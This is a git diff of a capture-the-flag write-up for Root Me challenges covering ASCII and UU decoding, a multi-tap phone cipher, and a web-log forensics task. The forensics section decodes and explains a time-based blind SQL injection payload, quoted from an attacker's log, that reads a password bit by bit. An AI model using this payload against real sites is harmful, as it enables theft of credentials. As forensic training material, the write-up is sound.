@@ -1,32 +1,122 @@
 # Root Me
 ## Encodage - ASCII:
-(https://www.root-me.org/fr/Challenges/Cryptanalyse/Encodage-ASCII)
+https://www.root-me.org/fr/Challenges/Cryptanalyse/Encodage-ASCII
 
-We're provided an associated resource to complete the challenge: ![image](https://user-images.githubusercontent.com/60375020/144291819-ed3343fb-46fc-4b95-b68c-52e6beb55899.png)
+We're provided an associated resource to complete the challenge: ![image](https://user-images.githubusercontent.com/60375020/144296644-fdb7ac8c-6eea-481b-b202-cea9ce7c03f2.png)
 
-Beginning the challenge, we're redirected to (http://challenge01.root-me.org/cryptanalyse/ch8/ch8.txt) and are provided the following string: 4C6520666C6167206465206365206368616C6C656E6765206573743A203261633337363438316165353436636436383964356239313237356433323465.
+Beginning the challenge, we're redirected to http://challenge01.root-me.org/cryptanalyse/ch8/ch8.txt and are provided the following string: 4C6520666C6167206465206365206368616C6C656E6765206573743A203261633337363438316165353436636436383964356239313237356433323465.
 
 Now we  just have to use the table provided to decode the string.
 
 <details>
   <summary> 📣 FLAG SPOILER WARNING 📣 </summary> 
   
-  This is the solution to the challenge, valued at 10 points. You might have to tweak the final result just a little.... 😉
+  This is the solution to the challenge, valued at 5 points. You might have to finish the rest.... 😉
   Can't go giving the true flag, now can I?
  
 Le flag de ce challenge est: [Really long string]
 </details>
 
-## Second:
+## Encodage - UU:
+https://www.root-me.org/fr/Challenges/Cryptanalyse/Encodage-UU
+
+We're provided a PDF titled 'EN - Encodings format.pdf': https://repository.root-me.org/Cryptographie/EN%20-%20Encodings%20format.pdf?_gl=1*bhowco*_ga*Mzg3ODQ3ODc2LjE2MzgyNDAxMDg.*_ga_SRYSKX09J7*MTYzODM3ODQyOC45LjEuMTYzODM4NDM4Ny4w. 
+
+Beginning the challenge, we're redirected to http://challenge01.root-me.org/cryptanalyse/ch1/ch1.txt. On this website, it gives us the following:
+```
+_=_ 
+_=_ Part 001 of 001 of file root-me_challenge_uudeview
+_=_ 
+
+begin 644 root-me_challenge_uudeview
+B5F5R>2!S:6UP;&4@.RD*4$%34R`](%5,5%)!4TE-4$Q%"@``
+`
+end
+```
+This is where the PDF resource really comes in handy. Flipping through, we can see it really breaks down UU Encoding and provides useful tables.
+<details>
+  <summary> 📣 FLAG SPOILER WARNING 📣 </summary> 
+  
+  This is the solution to the challenge, valued at 5 points. You might have to tweak the final result just a little.... 😉
+  Can't go giving the true flag, now can I?
+  
+```
+Very simple ;)
+PASS = [This should be the password] 
 ```
 
+</details>
+
+## Analyse de logs - attaque web:
+https://www.root-me.org/fr/Challenges/Forensic/Analyse-de-logs-attaque-web
+We're given the following hint: 'Énoncé - Notre site web semble avoir été attaqué, mais notre administrateur système ne comprend pas les logs du serveur web. Pouvez-vous retrouver les données qui ont été exfiltrées?'
+<details>
+  <summary> 🇬🇧 Translation 🇬🇧 </summary> 
+'Statement - Our website appears to have been attacked, but our system administrator does not understand the web server logs. Can you find the data that was exfiltrated?'
+</details>
+
+Beginning the challenge (http://challenge01.root-me.org/forensic/ch13/ch13.txt), we're able to see an access log. Looking at the first request we can see that it's using base64:
 ```
-## Third:
+192.168.1.23 - - [18/Jun/2015:12:12:54 +0200] "GET /admin/?action=membres&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D HTTP/1.1" 200 1005 "-" "-"
 ```
+```
+QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D
+```
+URL decoded:
+```
+QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk=
+```
+base64 decoded:
+```
+ASC,(SELECT (CASE FIELD(concat(SUBSTRING(bin(ascii(SUBSTRING(password,1,1))),1,1),SUBSTRING(bin(ascii(SUBSTRING(password,1,1))),2,1)),concat(CHAR(48),CHAR(48)),concat(CHAR(48),CHAR(49)),concat(CHAR(49),CHAR(48)),concat(CHAR(49),CHAR(49)))WHEN 1 THEN TRUE WHEN 2 THEN sleep(2) WHEN 3 THEN sleep(4) WHEN 4 THEN sleep(6) END) FROM membres WHERE id=1)
+```
+This looks interesting; the commas indicate a blind SQL attack. Expanding this, we can see it clearly:
+```SQL
+SELECT (
+        CASE FIELD (
+                concat(
+                        SUBSTRING(
+                                bin(ascii(SUBSTRING(password,1,1))), 1, 1
+                        ),
+                        SUBSTRING(
+                                bin(ascii(SUBSTRING(password,1,1))), 2, 1
+                        )
+                ),
+                concat(CHAR(48),CHAR(48)), 00
+                concat(CHAR(48),CHAR(49)), 01
+                concat(CHAR(49),CHAR(48)), 10
+                concat(CHAR(49),CHAR(49))  11
+        )
+        WHEN 1 THEN TRUE
+        WHEN 2 THEN sleep(2)
+        WHEN 3 THEN sleep(4)
+        WHEN 4 THEN sleep(6)
+        END
+) FROM membres WHERE id=1
+```
+From this we can see that the attacker checks what's in the password field, bit by bit. It takes the first character from the password, converts it to a bin representation, takes the first two bits and then compares to '00', '01', '10' and '11' strings. If it's '00', then nothing happens. If it's '01', the query waits 2 seconds, if it's '10', the query waits 4 seconds and if it's '11', the query waits 6 seconds.
+
+There's a 4th query which checks only one bit, so it's not as long. After 7 bits are rounded up, it becomes ASCII code.
+```SQL
+[18/Jun/2015:12:13:06 ASC,(
+        SELECT (
+                CASE FIELD (
+                        concat(
+                                SUBSTRING(
+                                        bin(ascii(SUBSTRING(password,1,1))),7,1
+                                )
+                        ),
+                        CHAR(48), 0
+                        CHAR(49)  1
+                )
+                WHEN 1 THEN sleep(2)
+                WHEN 2 THEN sleep(4)
+        END) FROM membres WHERE id=1)
 
 ```
+#Continue Editing here
 ## Steganomobile: 
-(https://www.root-me.org/en/Challenges/Steganography/Steganomobile)
+https://www.root-me.org/en/Challenges/Steganography/Steganomobile
 
 Before beginning the challenge, we're given a hint: 'After extraction of mobile data, the searcher, investigator have get this sequence of numbers. Maybe a phone number?'
 
@@ -36,7 +126,7 @@ From there, we can see we're given a string of numbers: 222-33-555-555-7-44-666-
 
 The lets us know that we're looking at phone-related information and should be looking into mobile-type ciphers.
 The first cipher that immediately pops into mind is the Multi-tap Phone (SMS). 
-We can easily look for a Multi-tap decoder online. The first one I'm able to find is (https://www.dcode.fr/multitap-abc-cipher).
+We can easily look for a Multi-tap decoder online. The first one I'm able to find is https://www.dcode.fr/multitap-abc-cipher.
 
 All I have to do is copy and paste the string of characters into the 'MULTI-TAP MOBILE PHONE CIPHERTEXT' section, and it gives you the password on the left side of the website, under 'Results'.
 
